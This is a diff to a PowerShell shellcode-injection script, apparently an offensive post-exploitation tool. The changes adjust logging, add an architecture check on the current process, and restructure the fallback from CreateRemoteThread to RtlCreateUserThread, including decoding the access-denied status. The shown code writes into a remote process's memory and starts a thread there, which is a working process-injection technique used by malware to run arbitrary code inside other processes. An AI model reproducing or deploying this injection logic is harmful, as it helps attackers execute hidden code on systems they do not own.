@@ -31,9 +31,8 @@ $pst = New-Object System.Diagnostics.ProcessStartInfo
 $pst.UseShellExecute = $False
 $pst.CreateNoWindow = $True
 $pst.FileName = "C:\Windows\system32\netsh.exe"
-
-echo "[+] Inject-Shellcode"
 echo ""
+echo "[+] Inject-Shellcode"
 if ($x86.IsPresent) {
     if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
         $pst.FileName = "C:\Windows\System32\netsh.exe"
@@ -65,13 +64,20 @@ if (($x86.IsPresent) -and ($ProcessX86)) {
     $Proceed = $true
 } elseif ($ProcessX86) {
     echo "[-] x86 process identified, use -x86 or this could crash the process"
-    echo ""
     echo "If you believe this is wrong use -Force to try injection anyway - use at own risk"
     $Proceed = $false
 } else {
     echo "[+] Running against x64 process with ID: $ProcessIDVal"
     $Proceed = $true
 }
+
+$CurrentProcX86 = IsProcess-x86 $PID
+if ($CurrentProcX86) {
+    echo "[+] Current process arch is x86: $ProcessIDVal"
+} else {
+    echo "[+] Current process arch is x64: $ProcessIDVal"    
+}
+echo ""
 
 if ($Proceed) {
 
@@ -100,22 +106,27 @@ try {
         echo "WriteProcessMemory"
         echo "[+] $s"
         $e = [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)
+
         echo "CreateRemoteThread"
+        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
         echo "[+] $e"
+        echo "[-] LastError: $Lasterror"  
 
         if ($e -eq 0) {
-        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        echo "[-] Failed using CreateRemoteThread"
-        echo "[-] LastError: $Lasterror"  
-        echo ""
-        $TokenHandle = [IntPtr]::Zero
-        $c = [Inject]::RtlCreateUserThread($phandle,0,0,0,0,0,[IntPtr]$x,0,[ref] $TokenHandle,0)    
-        echo "RtlCreateUserThread"
-        echo "[+] $c"
-        }
+            $TokenHandle = [IntPtr]::Zero
+            $c = [Inject]::RtlCreateUserThread($phandle,0,0,0,0,0,[IntPtr]$x,0,[ref] $TokenHandle,0)    
+            echo "RtlCreateUserThread"
+            $hexVal = "{0:x}" -f $c
+            if ($hexVal -eq "c0000022") {
+                echo "[-] Access Denied 0xC0000022"
+            } else {
+                echo "[+] Dec: $c"
+                echo "[+] Hex: 0x$($hexVal)"        
+            }
+        } 
 
         $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        echo "LastError: $Lasterror"    
+        echo "[-] LastError: $Lasterror"    
     } else {
         echo "[-] Failed using VirtualAllocEx"
         $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
